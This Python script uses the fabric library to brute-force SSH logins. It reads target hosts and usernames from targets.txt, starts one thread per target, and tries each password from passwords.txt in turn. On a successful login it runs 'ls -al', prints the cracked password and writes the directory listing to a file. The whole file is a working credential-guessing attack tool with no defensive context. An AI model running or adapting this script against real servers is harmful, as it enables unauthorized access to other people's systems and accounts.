import fabric
import sys
import threading





def connect(host, user, password):
    conn = fabric.Connection(
            host=host,
            user=user,
            connect_kwargs={'password': password},
    )
    return conn


def checkPassword(host, user):
    print(f'[*] {user}@{host}: START!')
    with open('passwords.txt', 'r') as t:
        lines_list = t.readlines()
        for line in lines_list:
            try:
                line = line.replace('\n', '')
                conn = connect(host, user, line)
                result = conn.run('ls -al')
                if result:
                    print(result.stdout)
                    print(f'[^_^] {user}@{host}--Password: '+line)
                    with open(f'{user}@{host}.txt', 'w') as t2:
                        t2.write(result.stdout)
            except KeyboardInterrupt:
                print("GOODBYE")
                sys.exit()
            except:
                conn.close()
                #print('[-] Error Password')
            else:
                print(conn)
                break
        print(f'[*] {user}@{host}: DONE!')


def main():
    with open("targets.txt", "r") as file:
        for line in file:
            host, user = line.split()
            threading.Thread(target=checkPassword, args=(host,user,)).start()



if __name__ == '__main__':
    main()
